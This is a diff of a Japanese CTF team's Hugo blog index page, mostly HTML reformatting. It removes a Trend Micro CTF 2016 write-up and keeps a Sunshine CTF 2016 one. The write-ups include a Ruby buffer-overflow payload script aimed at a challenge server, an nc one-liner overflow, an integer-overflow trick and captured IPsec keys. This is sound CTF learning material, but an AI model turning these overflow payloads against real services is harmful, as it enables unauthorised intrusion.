@@ -7,7 +7,7 @@
 
     <meta name="description" content="">
 
-    <meta name="generator" content="Hugo 0.40.1" />
+    <meta name="generator" content="Hugo 0.68.3" />
     <meta name="twitter:card" content="summary">
     
     <meta name="twitter:title" content="Posts &middot; urandom">
@@ -19,17 +19,12 @@
 
     <link href='//fonts.googleapis.com/css?family=Source+Sans+Pro:400,700|Oxygen:400,700' rel='stylesheet' type='text/css'>
     <link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/pure/0.6.0/pure-min.css">
-    <!--[if lte IE 8]>
-        <link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/pure/0.6.0/grids-responsive-old-ie-min.css">
-    <![endif]-->
-    <!--[if gt IE 8]><!-->
-        <link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/pure/0.6.0/grids-responsive-min.css">
-    <!--<![endif]-->
+    <link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/pure/0.6.0/grids-responsive-min.css">
 
-    <link rel="stylesheet" href="//blog.urandom.team/css/all.min.css">
+    <link rel="stylesheet" href='//blog.urandom.team/css/all.min.css'>
     <link href="//maxcdn.bootstrapcdn.com/font-awesome/4.3.0/css/font-awesome.min.css" rel="stylesheet">
 
-    <link rel="alternate" type="application/rss+xml" title="urandom" href="//blog.urandom.team/index.xml" />
+    <link rel="alternate" type="application/rss+xml" title="urandom" href='//blog.urandom.team/index.xml' />
 </head>
 <body>
 
@@ -46,8 +41,12 @@
             <ul class="nav-list">
                 
                 
+                
+                
                 <li class="nav-item">
-                    <a class="pure-button" href="//blog.urandom.team/index.xml"><i class="fa fa-rss"></i> rss</a>
+                    <a class="pure-button" href='//blog.urandom.team/index.xml'>
+                        <i class="fa fa-rss"></i> rss
+                    </a>
                 </li>
             </ul>
         </nav>
@@ -59,232 +58,6 @@
         <div>
             
             <div class="posts">
-                
-                <h1 class="content-subhead">17 Aug 2016, 00:17</h1>
-                <section class="post">
-                    <header class="post-header">
-
-                        <a href="//blog.urandom.team/post/tmctf2016-qual/" class="post-title">Trend Micro CTF 2016 Online qualifier</a>
-
-                        <p class="post-meta">
-                            
-                            
-                                under 
-                                
-                                <a class="post-category post-category-Write-ups" href="//blog.urandom.team/categories/write-ups">Write-ups</a>
-                            
-                        </p>
-                    </header>
-
-                    <div class="post-description">
-                        
-
-<p>日本時間 2016-07-30 13:00 から 2016-07-31 13:00まで（24時間）に行われた<a href="http://www.trendmicro.co.jp/jp/sp/ctf2016_jp/">Trend Micro CTF 2016</a>のwrite-upです。</p>
-
-<p>urandomは4問解答し600点、92位でした。</p>
-
-<p>Analysis-Offensive 100をyyu、Analysis-Offensive 200、Misc 100、Misc 200をmaythが解答しました。</p>
-
-<h1 id="analysis-offensive-100">Analysis - Offensive 100</h1>
-
-<blockquote>
-<p>Category: Analysis/Offensive</p>
-
-<p>Points: 100</p>
-
-<p>Please enter key. Key is TMCTF flag.</p>
-
-<p>Download the file
-Decrypt the downloaded file by the following command.</p>
-
-<p><code>openssl enc -d -aes-256-cbc -k x0nSTZ9NrDgvCnqKhL9y -in files1.enc -out files1.zip</code></p>
-
-<p><code>unzip files1.zip</code></p>
-</blockquote>
-
-<p>この問題は巨大なJavaScriptから正解の鍵を得るというものです。
-まず、巨大なJavaScriptのうちの多くの部分は定数をGoogleで調べるなどすると、MD5を実装しているということが分かります。そして、次の3つの文字列もMD5のハッシュ値であろうという推測ができます。</p>
-
-<pre><code class="language-javascript">var ko = &quot;c33367701511b4f6020ec61ded352059&quot;;
-
-var ka = &quot;61636f697b57b5b7d389db0edb801fc3&quot;;
-
-var kq = &quot;d2172edf24129e06f3913376a12919a4&quot;;
-</code></pre>
-
-<p>これらをまたGoogleで調べると、それぞれ次のような文字列であることが分かります。</p>
-
-<ul>
-<li><code>c33367701511b4f6020ec61ded352059</code> → <code>654321</code></li>
-<li><code>61636f697b57b5b7d389db0edb801fc3</code> → <code>qwerty</code></li>
-<li><code>d2172edf24129e06f3913376a12919a4</code> → <code>admin</code></li>
-</ul>
-
-<p>そして次の処理でこれらの文字列を変数<code>nl</code>に従って並び換えているということが分かります。</p>
-
-<pre><code class="language-javascript">var c = &quot;&quot;, d = &quot;&quot;, e = &quot;&quot;;
-for (var f = 0; f &lt; b.length; ) {
-    c += b[nl[++f]];
-    d += b[nl[++f]];
-    e += b[nl[++f]];
-}
-
-// ......中略......
-
-var nl = [ 0, 2, 1, 12, 7, 15, 5, 4, 8, 16, 17, 3, 9, 10, 14, 11, 13, 6, 0 ];
-</code></pre>
-
-<p>最終的にフラグは<code>TMCTF{q6r4dy5ei2na1twm3}</code>でした。</p>
-
-<h1 id="analysis-offensive-200">Analysis - Offensive 200</h1>
-
-<blockquote>
-<p>Category: Analysis - offensive</p>
-
-<p>Points: 200</p>
-
-<p>This challenge is composed of a simple remote overflow of a global array. The server address is 52.197.128.90 and the vulnerable application listens on TCP port 80-85. Each port has the same behavior so you can select one of them.</p>
-
-<p>The following code contains a bug that can be exploited to read back a flag:</p>
-
-<pre><code class="language-c">int pwned;
-char buffer[1024];
-
-DWORD WINAPI CallBack(LPVOID lpParameter) {
-	pwned = 0;
-	ZeroMemory(buffer, 1024);
-	SOCKET *sock = (SOCKET *)lpParameter;
-	SOCKET _sock = *sock;
-	send(_sock, &quot;Welcome&quot;, 8, 0);
-	int ret = 0;
-	ret = recv(_sock, buffer, 1028, 0);
-	printf(&quot;[x] RET: %d.\n&quot;, ret);
-	printf(&quot;[x] PWNED: 0x%x.\n&quot;, pwned);
-	Sleep(1);
-	if (((pwned &gt;&gt; 16)&amp;0xFFFF ^ 0xc0fe) == 0x7eaf &amp;&amp; (((pwned &amp; 0xFFFF)^0x1a1a) == 0xdae4)) {
-
-			send(_sock, &quot;PWNED&quot;, 5, 0);
-			ReadAndReturn(L&quot;key.txt&quot;, _sock);
-			closesocket(_sock);
-			return 0;
-	}
-	else {
-		send(_sock, &quot;GO AWAY&quot;, 7, 0);
-		closesocket(_sock);
-	}
-
-	return 0;
- }
-</code></pre>
-
-<p>Craft a packet that would return a valid flag. Good luck!</p>
-</blockquote>
-
-<p><code>buffer</code>が1024バイトしか確保されていないにもかかわらず、11行目で <code>ret = recv(_sock, buffer, 1028, 0);</code> と1028バイト読み込むようになっている。したがって、1025-1028バイトの範囲に特定のバイト列を仕込めばよい。満たすべき条件は15行目のif文。</p>
-
-<p>なぜか <code>nc</code> が1024バイトで送信を打ち切ってしまったので、Rubyで書いた。</p>
-
-<pre><code class="language-ruby">require 'socket'
-
-HOST = '52.197.128.90'
-port = (80..85).to_a.sample
-
-puts &quot;connecting #{HOST}:#{port}&quot;
-sock = TCPSocket.open('52.197.128.90', port)
-
-payload = 'a' * 1024 + &quot;\xfe\xc0\x51\xbe&quot;
-
-sock.read(8)
-sock.send(payload, 0)
-while r = sock.gets
-  puts r
-end
-</code></pre>
-
-<p>そして正解をメモし忘れた 😇</p>
-
-<h1 id="misc-100">Misc 100</h1>
-
-<blockquote>
-<p>Category: Misc(iot and network)</p>
-
-<p>Points: 100</p>
-
-<p>Please analyze this pcap.</p>
-</blockquote>
-
-<p>pcapファイルが渡される。中身を見ると、IPsecな通信と、普通にtelnetしている通信がある。</p>
-
-<p>Wiresharkでtelnetでのやりとりをテキストとして見ると、 <code>ip xfrm state</code>を叩いている箇所がある。</p>
-
-<pre><code>.]0;reds@localhost:~.[reds@localhost ~]$ sudo ip xfrm state
-.sudo ip xfrm state
-[sudo] password for reds: ynwa
-.
-src 1.1.1.11 dst 1.1.1.10
-	proto esp spi 0xfab21777 reqid 16389 mode tunnel
-	replay-window 32 flag 20
-	auth hmac(sha1) 0x11cf27c5b3357a5fd5d26d253fffd5339a99b4d1
-	enc cbc(aes) 0xfa19ff5565b1666d3dd16fcfda62820da44b2b51672a85fed155521bedb243ee
-src 1.1.1.10 dst 1.1.1.11
-	proto esp spi 0xbfd6dc1c reqid 16389 mode tunnel
-	replay-window 32 flag 20
-	auth hmac(sha1) 0x829b457814bd8856e51cce1d745619507ca1b257
-	enc cbc(aes) 0x2a340c090abec9186c841017714a233fba6144b3cb20c898db4a30f02b0a003d
-src 1.1.1.10 dst 1.1.1.11
-	proto esp spi 0xeea1503c reqid 16389 mode tunnel
-	replay-window 32 flag 20
-	auth hmac(sha1) 0x951d2d93498d2e7479c28c1bcc203ace34d7fcde
-	enc cbc(aes) 0x6ec6072dd25a6bcb7b9b3b516529acb641a1b356999f791eb971e57cc934a5eb
-src 1.1.1.11 dst 1.1.1.10
-	proto esp spi 0xd4d2074d reqid 16389 mode tunnel
-	replay-window 32 flag 20
-	auth hmac(sha1) 0x100a0b23fc006c867455506843cc96ad26026ec0
-	enc cbc(aes) 0xdcfbc7d33d3c606de488c6efac4624ed50b550c88be0d62befb049992972cca6
-</code></pre>
-
-<p>この情報を元に、IPsecの通信の中身を見ることができる。すると、HTTPでいくつかやりとりをしている箇所が見つかる。その中に <code>flag.png</code> というファイルのダウンロードが含まれている。これを抽出して開くと、フラグが書かれている。</p>
-
-<h1 id="misc-200">Misc 200</h1>
-
-<blockquote>
-<p>Category: Misc(iot and network)</p>
-
-<p>Points: 200</p>
-
-<p>find all LTE bands this phone supported.</p>
-
-<p>the final answer will be from small to big, and use &lsquo;,&rsquo; to seperate without spaces.</p>
-
-<p>example&gt; if the answer is band 1 and 2 and 3, the key should be: &ldquo;TMCTF{1,2,3}&rdquo;</p>
-</blockquote>
-
-<p><code>ModemSettings.txt</code> というファイルが与えられ、そこからその携帯電話の対応しているLTEバンドを答える。</p>
-
-<p>この <code>ModemSettings.txt</code> はどうやら NV-items_reader_writerというソフトウェアによる出力らしい。</p>
-
-<p>LTEのバンドに関する設定は&rdquo;6828&rdquo;番にあるという。該当する箇所を引用する。</p>
-
-<pre><code>6828 (0x1AAC)   -   OK
-FF 1D 1F 03 00 00 00 00 00 00 00 00 00 00 00 00
-00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
-00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
-00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
-00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
-00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
-00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
-00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
-</code></pre>
-
-<p>ここに書き込まれている数値が対応LTEバンドを表している。ビット単位で読んで、あるビットが立っていたら、そのビットと対応するバンドをサポートしていることを意味している。最右ビットがバンド1に対応する。</p>
-
-<p>寝起きでつらいワンライナーを書いておしまい。エンディアンに注意。</p>
-
-<pre><code class="language-ruby">i=0; puts (0x031F1DFF).to_s(2).reverse.split(//).map { |c| i +=1; [c, i] }.select { |x| x[0] == '1' }.map { |x| x[1] }.join(',')
-</code></pre>
-
-                    </div>
-                </section>
                 
                 <h1 class="content-subhead">11 Aug 2016, 00:47</h1>
                 <section class="post">
@@ -299,26 +72,23 @@ FF 1D 1F 03 00 00 00 00 00 00 00 00 00 00 00 00
                             
                                 under 
                                 
-                                <a class="post-category post-category-Publication" href="//blog.urandom.team/categories/publication">Publication</a>
+                                    <a class="post-category post-category-Publication" href='//blog.urandom.team/categories/Publication'>Publication</a>
+                                
                             
                         </p>
                     </header>
 
                     <div class="post-description">
-                        <p><a href="/pdfs/c90_sample.pdf"><img src="/images/c90_cover_thumb.png" alt="C90 Sample" /></a></p>
-
+                        <p><a href="/pdfs/c90_sample.pdf"><img src="/images/c90_cover_thumb.png" alt="C90 Sample"></a></p>
 <p>CTFサークルurandomは、コミックマーケット90で新刊「urandom vol.2」を頒布します。
 スペースは<strong>3日目 東4ホール ム-43b</strong>です。
 記事は以下の2本で、42P 300円で頒布します。</p>
-
 <ul>
 <li>バイナリの調べ方 (by op)</li>
 <li>Mental Game! (by yyu)</li>
 </ul>
-
 <p>表紙デザインはpolamjagです。
 それぞれの記事から2Pずつ抜粋した<a href="/pdfs/c90_sample.pdf">サンプル</a>を公開します。</p>
-
 <p>また、この新刊のおまけとして<strong>DEF CON CTF 2016 Final参戦記</strong>をコピ本で頒布予定です。
 8/5-7にアメリカ ラスベガスで開催されたDEF CON CTF 2016 Finalについて、opがCTFチームbinjaのメンバーとして参加した経験を記したもので、現在執筆中です(こちらはurandomとは関係ありません)。</p>
 
@@ -338,32 +108,28 @@ FF 1D 1F 03 00 00 00 00 00 00 00 00 00 00 00 00
                             
                                 under 
                                 
-                                <a class="post-category post-category-Publication" href="//blog.urandom.team/categories/publication">Publication</a>
+                                    <a class="post-category post-category-Publication" href='//blog.urandom.team/categories/Publication'>Publication</a>
+                                
                             
                         </p>
                     </header>
 
                     <div class="post-description">
-                        <p>C90（2016年夏コミ）当選してました。スペースは <strong>3日目 東ム-43b</strong> です。C89に引き続き、&rdquo;urandom vol.2&rdquo;を出します。内容は引き続いてないです。</p>
-
+                        <p>C90（2016年夏コミ）当選してました。スペースは <strong>3日目 東ム-43b</strong> です。C89に引き続き、&ldquo;urandom vol.2&quot;を出します。内容は引き続いてないです。</p>
 <p>urandom vol.2はこんな感じの内容になります。</p>
-
 <ul>
 <li>バイナリの調べ方 (by op)</li>
 <li>Mental Game! (by yyu)</li>
 </ul>
-
 <p>この内容で入稿を完了しています。後ほどサンプルをアップロードします。</p>
-
-<hr />
-
+<hr>
 <ul>
 <li>（2016-07-20 修正）
-
 <ul>
 <li>諸般の事情により『.NET難読化ツール事始め』(fetastein)に代わって、『Mental Game!』(yyu)となりました</li>
 <li>入稿完了したよ！！！！</li>
-</ul></li>
+</ul>
+</li>
 </ul>
 
                     </div>
@@ -382,66 +148,46 @@ FF 1D 1F 03 00 00 00 00 00 00 00 00 00 00 00 00
                             
                                 under 
                                 
-                                <a class="post-category post-category-Write-ups" href="//blog.urandom.team/categories/write-ups">Write-ups</a>
+                                    <a class="post-category post-category-Write-ups" href='//blog.urandom.team/categories/Write-ups'>Write-ups</a>
+                                
                             
                         </p>
                     </header>
 
                     <div class="post-description">
-                        
-
-<p>2016-03-13 01:00 - 2016-03-14 05:00 (JST)に開催された<a href="http://ctf.bsidesorlando.org/">Sunshine CTF 2016</a>のwrite-upです。</p>
-
+                        <p>2016-03-13 01:00 - 2016-03-14 05:00 (JST)に開催された<a href="http://ctf.bsidesorlando.org/">Sunshine CTF 2016</a>のwrite-upです。</p>
 <p>なお、今回は以下のメンバー編成で参加しました。</p>
-
 <ul>
 <li>mayth （土曜日を寝て潰す担当）</li>
 <li>op （たまに現れていくらかの助言と違法語句を残して去って行く担当）</li>
 </ul>
-
 <p>ESTはクソ。</p>
-
 <h1 id="forensics-50-butterfly-effect">Forensics 50: Butterfly Effect</h1>
-
 <p><code>butterfly.png</code>が与えられる。</p>
-
-<p><a href="http://www1.chapman.edu/~nabav100/ImgStegano/">ImgStegano</a>にファイルを読み込ませて&rdquo;Image &gt; Enhanced LSB&rdquo;とするとフラグが現れた。</p>
-
+<p><a href="http://www1.chapman.edu/~nabav100/ImgStegano/">ImgStegano</a>にファイルを読み込ませて&quot;Image &gt; Enhanced LSB&quot;とするとフラグが現れた。</p>
 <blockquote>
 <p>sun{RE4DY_THE_4CID_M4GNET!}</p>
 </blockquote>
-
 <h1 id="exploitation-50-alligatorsim95">Exploitation 50: alligatorsim95</h1>
-
 <blockquote>
 <p>Don&rsquo;t try to automate adding X eggs at a time</p>
-
 <p>legends circulate in florida of an alligator that had laid millions of eggs. use this simulator to try to achieve the same greatness</p>
 </blockquote>
-
 <p>※プログラムは与えられない。</p>
-
 <p>指定されたIPアドレス/ポートにncで接続すると、アリゲーターのAAと共に文章が流れてくる。</p>
-
 <pre><code>-&gt; u r... AN ALLIGATOR!!
 .. simulating alligator lifecycle ..
 .. simulating alligator throwing physics..
 -&gt; you got 1337 eggz in ur nest, how many you gonna lay alligator??
-</code></pre>
-
-<p>この後に整数値を入力すると、その数だけ卵の数（上記の通り初期値1337）が増える。ただし上限は50。それを超えると拒否され再度同様のプロンプトが現れる。接続を切られるのは以下の通り。</p>
-
+</code></pre><p>この後に整数値を入力すると、その数だけ卵の数（上記の通り初期値1337）が増える。ただし上限は50。それを超えると拒否され再度同様のプロンプトが現れる。接続を切られるのは以下の通り。</p>
 <ul>
 <li><code>echo</code>とかで入力を機械的に流し込もうとしたとき (&ldquo;Don&rsquo;t try to automate adding X eggs at a time&rdquo;)</li>
 <li>0や数字として解釈出来ない数を与えたとき</li>
 <li>一定時間が経過したとき</li>
 </ul>
-
 <p>この条件下で卵の数を大きくする問題。</p>
-
 <p>色々入力を試すと、0はダメだが負数を受け付けること、また、負数であれば絶対値がいくら大きくてもよいことがわかった。
 これを利用すると整数オーバーフローを引き起こすことができる。そうすると卵の数は非常に大きな値となり、フラグを得ることができる。</p>
-
 <pre><code>-&gt; u r... AN ALLIGATOR!!
 .. simulating alligator lifecycle ..
 .. simulating alligator throwing physics..
@@ -458,44 +204,28 @@ FF 1D 1F 03 00 00 00 00 00 00 00 00 00 00 00 00
 -&gt; dang 2147444976 is a lotta eggs
 -&gt; as a god among gators here is ur crown:
 sun{int_0verflow_i5_a_g0od_st4rt}
-</code></pre>
-
-<blockquote>
+</code></pre><blockquote>
 <p>sun{int_0verflow_i5_a_g0od_st4rt}</p>
 </blockquote>
-
 <h1 id="exploitation-55-dance">Exploitation 55: Dance</h1>
-
 <blockquote>
 <p>Some prefer the stanky leg, others prefer the dab, but what dance moves do you have?</p>
 </blockquote>
-
 <p>IPアドレスとポート番号が指定される。当初プログラムは与えられなかったが、後にフラグ部分を潰したバイナリが配布された。</p>
-
 <p>サーバーに接続すると以下のような文字が流れてくる。</p>
-
 <pre><code>welcome to the pro club. you just paid a door fee and have no respect. earn ur cred on the dancefloor!
 give us ur sick dance moves like so:
 whip,naenae,whip,whip,naenae&lt;ENTER&gt;
-</code></pre>
-
-<p><code>whip</code>か<code>naenae</code>をカンマ区切りで並べて送信すると</p>
-
+</code></pre><p><code>whip</code>か<code>naenae</code>をカンマ区切りで並べて送信すると</p>
 <pre><code>do the naenae
 (\)
   \(:O)
    /||\_
 _/¯    ¯\_
-</code></pre>
-
-<p>こんな感じで対応したアクションと愉快なAAが流れてくる。</p>
-
+</code></pre><p>こんな感じで対応したアクションと愉快なAAが流れてくる。</p>
 <p>当初何をさせたいのかさっぱりわからなかったが、バイナリが配布されたのでそれを読んだ。</p>
-
 <p>その結果、こちらからの入力を受け取るバッファについて、<code>memset</code>で80bytesを<code>NULL</code>で初期化しているにも関わらず、<code>fgets</code>で最大89bytesまで読み込むようになっていることがわかった。また、0で初期化された特定の変数の値が書き換わっているときにフラグが表示されるようになっていることがわかった。</p>
-
 <p>入力の読み込みはだいたい次のようなロジックになっている。</p>
-
 <pre><code>while (strlen(buf) &gt; 0) {
   if (*buf == 'n') {
     buf += 7;
@@ -506,10 +236,7 @@ _/¯    ¯\_
   }
 }
 check_flag();
-</code></pre>
-
-<p>先頭しか見てないっぽいので適当に80文字の&rdquo;n&rdquo;を送り付けたところ、フラグが得られた。</p>
-
+</code></pre><p>先頭しか見てないっぽいので適当に80文字の&quot;n&quot;を送り付けたところ、フラグが得られた。</p>
 <pre><code>% ruby -e 'puts &quot;n&quot; * 0x50' | nc ****
 welcome to the pro club. you just paid a door fee and have no respect. earn ur cred on the dancefloor!
 give us ur sick dance moves like so:
@@ -528,45 +255,30 @@ _/¯    ¯\_
 girl u can dance w the best of em. the pw to our vip lounge is: sun{d4nc3_0n_th3_s7ack}
 
 cool dance! come again!
-</code></pre>
-
-<blockquote>
+</code></pre><blockquote>
 <p>sun{d4nc3_0n_th3_s7ack}</p>
 </blockquote>
-
 <h1 id="misc-50-find-floridaman">Misc 50: Find Floridaman</h1>
-
 <blockquote>
 <p>In other news&hellip; Floridaman did what with an alligator?</p>
-
 <p>Remember, this has the normal flag format.</p>
-
 <p>Hint: You need only look at comments from Florida-based news websites.</p>
-
 <p>Hint: Gator went threw a window!</p>
-
 <p>Hint: &ldquo;Flori-duh&rdquo;</p>
-
 <p>NOTE: Flag was posted before the 12th</p>
 </blockquote>
-
 <p>フロリダマンを探すマン。</p>
-
 <p>問題オープン当初は最初の2文だけだったのが、誰も解かないからか次々にヒントが追加されて結局ヒントが3つになった。</p>
-
-<p>ヒントが3つになってから、そのヒントを元に&rdquo;Flori-duh Alligator&rdquo;で探してみると、次の記事が見つかった。</p>
-
+<p>ヒントが3つになってから、そのヒントを元に&quot;Flori-duh Alligator&quot;で探してみると、次の記事が見つかった。</p>
 <p><a href="http://www.mypalmbeachpost.com/news/news/crime-law/wendys-alligator-thrower-is-only-fulfilling-his-fl/nqNfr/">Wendy’s alligator-thrower is only fulfilling his Flori-duh destiny</a></p>
-
 <p>この記事のReader Commentsにフラグがある。</p>
-
 <blockquote>
 <p>Summerc137 3 days ago
 May the Lord have mercy on this man. That poor woman in the drivethrough! sun{1s_th1s_even_real_l1fe?}</p>
-
+</blockquote>
+<blockquote>
 <p>sun{1s_th1s_even_real_l1fe?}</p>
 </blockquote>
-
 <p>ちなみにこの事件、なんでも1mちょっとあるアリゲーターをWendy&rsquo;sのドライブスルーの窓から投げ込んだのだそうな。さすがアメリカ。</p>
 
                     </div>
@@ -587,16 +299,10 @@ May the Lord have mercy on this man. That poor woman in the drivethrough! sun{1s
                     </header>
 
                     <div class="post-description">
-                        
-
-<p>大変長らくお待たせしました。urandom vol.1の電子書籍版をリリースしました。電子書籍版は<strong>256円</strong>での販売です。内容は物理書籍版と同一です。</p>
-
-<p><strong><a href="https://gumroad.com/l/xgnF/">販売ページはこちら</a></strong>です（Gumroadに移動します）。決済にはクレジットカードかPayPalが使えます。</p>
-
+                        <p>大変長らくお待たせしました。urandom vol.1の電子書籍版をリリースしました。電子書籍版は<strong>256円</strong>での販売です。内容は物理書籍版と同一です。</p>
+<p>**<a href="https://gumroad.com/l/xgnF/">販売ページはこちら</a>**です（Gumroadに移動します）。決済にはクレジットカードかPayPalが使えます。</p>
 <h2 id="物理書籍を購入した方へ">物理書籍を購入した方へ</h2>
-
-<p>購入ページに&rdquo;Offer code&rdquo;という欄がありますので、そちらに物理書籍挟み込みの紙に記載されたコードを入力してください。</p>
-
+<p>購入ページに&quot;Offer code&quot;という欄がありますので、そちらに物理書籍挟み込みの紙に記載されたコードを入力してください。</p>
 <ul>
 <li>コードを使用する場合、クレジットカード情報は不要です（正しいコードを入力すると入力欄が非表示になります）。</li>
 <li>同一コードは10回まで使用可能です。ダウンロードしたデータを紛失した際は同一コードを入力してください。</li>
@@ -621,19 +327,14 @@ May the Lord have mercy on this man. That poor woman in the drivethrough! sun{1s
 
                     <div class="post-description">
                         <p><a href="//blog.urandom.team/post/c89-pre/">先の記事</a>で述べている通り、CTFチームurandomとしてコミックマーケット89で同人誌「urandom vol.1」を頒布します（入稿間に合った）。</p>
-
 <p>その同人誌にIDA Pythonの記事を書きました。タイトルは「Easy Recipes for IDA Python」。本全体で三章構成になっている内の一章です。
 内容は、タイトルの通り<strong>IDA Pythonのための簡単レシピ</strong>的なものになっています。
 IDAによる解析作業中に起こりそうな問題ケースを3つ挙げ、それらを解決する比較的簡単なIDA Pythonスクリプトの例とその解説を書いています。</p>
-
 <p>こんなん。</p>
-
-<p><a href="/images/c89_idapython_p13-14.png"><img src="/images/c89_idapython_p13-14.png" alt="Easy Recipes for IDA Python" /></a></p>
-
+<p><a href="/images/c89_idapython_p13-14.png"><img src="/images/c89_idapython_p13-14.png" alt="Easy Recipes for IDA Python"></a></p>
 <p><strong>C89 3日目(15/12/31) 東ホ-05b</strong> 500円です。
 2016年2月以降に電子書籍化する予定（詳細未定）ですが、物理本の購入者には電子書籍版を無料で提供します。</p>
-
-<p><a href="/images/c89_cover_sm.png"><img src="/images/c89_cover_thumb.png" alt="urandom vol.1 表紙" /></a></p>
+<p><a href="/images/c89_cover_sm.png"><img src="/images/c89_cover_thumb.png" alt="urandom vol.1 表紙"></a></p>
 
                     </div>
                 </section>
@@ -654,25 +355,15 @@ IDAによる解析作業中に起こりそうな問題ケースを3つ挙げ、�
 
                     <div class="post-description">
                         <p>いよいよ明日がコミケ初日ですよ！</p>
-
 <p>むっちゃドキドキしてきた…。</p>
-
 <p>コミケ戦士の皆さん、今日くらいは自慰は休んで明日に備えますよね？</p>
-
 <p>というわけでこんにちは、maythです。opが記事説明上げてたので、コミケ初日の今日に至って私もなんか書いておこうかと思います。</p>
-
 <p>今回は <strong>デコンパイラを殺すIL</strong> という記事を書いています。殺すといってもSEGVさせるとかではなく、デコンパイルを失敗させるというお話です。</p>
-
 <p>元々は『<a href="http://cedec.cesa.or.jp/2015/session/ENG/10405.html">SECCON 2015 x CEDEC CHALLENGE ゲームクラッキング＆チートチャレンジ</a>』の発表で触れた内容です（発表資料は<a href="http://2015.seccon.jp/cedec-challenge-2015.html">SECCON 2015の当該記事</a>にあります）。当日は時間が限られており、チート対策としてのデコンパイル妨害については簡単なサンプルを示すだけにとどめました。その辺りを突っ込んで書いています。</p>
-
 <p>デコンパイル妨害の指南書というよりかは、調査報告といった感じになっています。実際、本記事の流れはtkbctf2のSkill Analyzerを作るにあたって調査した分に、横浜大会で資料を作る際に再調査した分を付け加えつつ、当時の私の思考と実験をトレースしたような構成としました。</p>
-
 <p>.NET周りのエンジニアの方にチラッと読んでもらいたい感じの記事です。最近はUnityでMonoを使う機会も増えているかと思います。</p>
-
 <p>3日目（31日 木曜日）、スペースは <strong>東ホ-05b &ldquo;urandom&rdquo;</strong> 、頒布価格は500円です。</p>
-
 <p>それでは、当日スペースにてお待ちしております。</p>
-
 <p>note: なお、記事に関するツッコミ等は適宜ブログ記事上げてもらうなり、<a href="https://twitter.com/maytheplic">@maytheplic</a>までTwitterでリプを飛ばすなりしていただければ。</p>
 
                     </div>
@@ -694,46 +385,34 @@ IDAによる解析作業中に起こりそうな問題ケースを3つ挙げ、�
 
                     <div class="post-description">
                         <p>maythです。無事に（？）本が出来つつあります（出来たとは言っていない）。世間ではスターのウォーズのなんかの公開が間近に迫っていますが、我々に迫っているのは締め切りとクソコードです。</p>
-
-<p>&ldquo;urandom vol.1&rdquo;は記事3本でお送りします。記事の著者から内容について簡単なひとことを要求したところ1名ドロップしました。とりあえずこんな内容になります。</p>
-
+<p>&ldquo;urandom vol.1&quot;は記事3本でお送りします。記事の著者から内容について簡単なひとことを要求したところ1名ドロップしました。とりあえずこんな内容になります。</p>
 <ul>
 <li><strong>Easy Recipes for IDA Python</strong> (by op)
-
 <ul>
 <li>IDA Pythonの為の簡単なレシピを解説します。</li>
-</ul></li>
+</ul>
+</li>
 <li><strong>デコンパイラを殺すIL</strong> (by mayth)
-
 <ul>
 <li>.NETアプリのデコンパイルを失敗させるべく、我々調査隊はILの奥地へと飛んだ。</li>
-</ul></li>
+</ul>
+</li>
 <li><strong>秘密計算入門</strong> (by yyu)</li>
 </ul>
-
-<hr />
-
+<hr>
 <p>(2015-12-25 追記)</p>
-
 <p>すっかり告知を忘れていましたが入稿を完了しています。
 こんな感じの表紙です。
 見事に華がないですね。
 当日はスペースに何か目印っぽいものを張っておこうと思ったのですが未だ未完成です。
 とりあえずスペース番号がわかりやすい何かを置いておきます、たぶん。</p>
-
 <p>改めて参加日とスペースの告知ですが、<strong>3日目（木曜日） 東ホ-05b</strong> です。
 執筆者でさえ忘れていてWebカタログの地図で自分のサークルを見失いました。</p>
-
-<p><a href="/images/c89_cover_sm.png"><img src="/images/c89_cover_thumb.png" alt="urandom vol.1 表紙" /></a></p>
-
+<p><a href="/images/c89_cover_sm.png"><img src="/images/c89_cover_thumb.png" alt="urandom vol.1 表紙"></a></p>
 <p>なお、<strong>頒布価格は500円を予定しています</strong>。消費税はありませんので、本当に500円だけ握りしめて来て頂ければと思います。</p>
-
 <p>当日誰が売り子やるのかもさっぱり定まっていませんが、スペースでお待ちしております。それでは。</p>
-
-<hr />
-
+<hr>
 <p>(2015-12-27 追記)</p>
-
 <p>この同人誌は2016年2月以降に電子書籍化する予定（詳細未定）です。物理本の購入者には電子書籍版を無料で提供します。</p>
 
                     </div>
@@ -755,19 +434,14 @@ IDAによる解析作業中に起こりそうな問題ケースを3つ挙げ、�
 
                     <div class="post-description">
                         <p>C89当選しました。スペースは <strong>3日目 東ホ-05b</strong> です。</p>
-
 <p>以前の告知通りの本が出ます。</p>
-
 <ul>
 <li>一歩差がつくIDAコーデ (by op)</li>
 <li>デコンパイラを殺すIL (by mayth)</li>
 <li>他、予定は未定</li>
 </ul>
-
 <p>未だ目次が決まらないあたりに危機感を覚えつつ鋭意執筆中です。</p>
-
 <p>詳細が決まり次第こちらの記事をアップデートします。Twitterではだいたい私が告知しますが、普段のノイズが多いのでいい感じにウォッチしてください。</p>
-
 <p>ちょっと気が早いですが当日皆さんにお会いできるのを楽しみにしています。それでは。</p>
 
                     </div>
@@ -788,19 +462,14 @@ IDAによる解析作業中に起こりそうな問題ケースを3つ挙げ、�
                     </header>
 
                     <div class="post-description">
-                        <p><a href="/images/c89_cut.png"><img src="/images/c89_cut_small.png" alt="C89 サークルカット" /></a></p>
-
-<p>C89に&rdquo;urandom&rdquo;で申し込んでいます。</p>
-
-<p>『コンピュータセキュリティ総合誌』と称したよろず本、&rdquo;urandom vol.1&rdquo;を頒布予定です。サークルカットにある通り、現時点ではこんな内容です。</p>
-
+                        <p><a href="/images/c89_cut.png"><img src="/images/c89_cut_small.png" alt="C89 サークルカット"></a></p>
+<p>C89に&quot;urandom&quot;で申し込んでいます。</p>
+<p>『コンピュータセキュリティ総合誌』と称したよろず本、&ldquo;urandom vol.1&quot;を頒布予定です。サークルカットにある通り、現時点ではこんな内容です。</p>
 <ul>
 <li>デコンパイラを殺すIL</li>
 <li>一歩差がつくIDAコーデ</li>
 </ul>
-
